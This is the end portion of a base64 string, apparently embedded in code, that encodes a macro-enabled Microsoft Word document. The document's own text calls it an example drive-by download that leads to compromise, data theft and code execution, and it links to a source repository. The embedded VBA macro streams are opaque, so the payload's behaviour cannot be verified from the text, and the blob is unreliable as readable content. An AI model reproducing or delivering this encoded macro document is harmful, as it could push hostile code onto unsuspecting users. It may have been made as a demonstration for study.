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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALQCAAAMAAAAwAIAAAwAAAAAAAAAAAAAAIgDAADaAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwCAACbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYgYAAGICAADECAAAZgAAAHMDAAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGcDAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIA2QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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');
```
